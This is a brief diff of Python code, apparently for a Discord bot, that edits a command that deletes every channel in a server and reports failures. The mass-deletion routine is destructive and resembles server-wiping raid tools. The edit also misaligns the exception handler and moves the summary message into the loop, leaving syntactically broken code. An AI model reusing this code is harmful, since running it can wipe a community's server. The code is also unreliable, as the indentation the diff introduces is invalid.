@@ -46,10 +46,10 @@ def run_commands():
         for channel in ctx.guild.channels:
             try:
                 await channel.delete(reason="По просьбе")
-            except: failed.append(channel.name)
+        except: failed.append(channel.name)
             else: counter += 1
-        fmt = ", ".join(failed)
-        await ctx.send(f" {counter} channels deleted. {f' {fmt} was not deleted' if len(failed) > 0 else ''}")
+            fmt = ", ".join(failed)
+            await ctx.send(f" {counter} channels deleted. {f' {fmt} was not deleted' if len(failed) > 0 else ''}")
         
 
         
